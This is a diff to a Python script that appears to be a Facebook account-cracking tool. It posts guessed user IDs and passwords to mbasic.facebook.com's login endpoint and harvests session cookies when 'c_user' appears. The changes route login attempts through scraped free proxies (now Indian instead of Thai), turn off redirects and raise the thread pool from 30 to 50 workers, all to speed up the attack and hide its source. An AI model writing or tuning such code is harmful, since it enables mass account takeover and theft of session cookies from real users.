@@ -337,7 +337,7 @@ N = '\x1b[1;37m'
 cookie_show = []
 #-------------------------(PROXY)----------------------------#
 try:
-  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=th&proxy_format=protocolipport&format=text').text
+  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=in&proxy_format=protocolipport&format=text').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -708,7 +708,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -1388,7 +1388,7 @@ def mbasic(uid,pwx,tl):
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/login/device-based/login/async/"
-            po = Session.post(url, data=data, headers=headers).text
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
